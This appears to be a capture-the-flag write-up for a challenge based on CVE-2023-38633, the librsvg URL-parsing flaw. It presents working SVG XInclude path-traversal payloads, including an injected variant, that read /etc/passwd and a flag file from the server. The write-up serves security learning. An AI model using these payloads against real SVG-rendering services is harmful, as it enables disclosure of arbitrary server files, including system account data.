
## Vulnerability Info
Challenge based on the CVE-2023-38633:
 - https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/

With a publicly available exploit (that does not work out of the box for this challenge):
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
  <rect width="300" height="300" style="fill:rgb(255,204,204);" />
  <text x="0" y="100">
    <xi:include
      href=".?../../../../../../../etc/passwd"
      parse="text"
      encoding="ASCII"
    >
      <xi:fallback>file not found</xi:fallback>
    </xi:include>
  </text>
</svg>
```

## Exploitation

You need to embed the svg inside the svg:
```xml
</text>
<g x="0" y="0" width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
  <text x="0" y="100">
    <xi:include href=".?../../../../../../../etc/passwd" parse="text" encoding="ASCII">
      <xi:fallback>file not found</xi:fallback>
    </xi:include>
  </text>
</g><text>
```

Now try to load the flag:
```xml
</text>
<g x="0" y="0" width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
  <text fill="red" stroke="black" x="0" y="100">
    <xi:include href=".?../../../../../../../app/flag.txt" parse="text" encoding="ASCII">
      <xi:fallback>file not found</xi:fallback>
    </xi:include>
  </text>
</g><text>
```

Minimify the exploit in length so that it fits the challenge restrictions:
```xml
</text><g xmlns:xi="http://www.w3.org/2001/XInclude"><text y="10" font-family="monospace"><xi:include href=".?../../../../app/flag.txt" parse="text" encoding="ASCII"></xi:include></text></g><text>
```
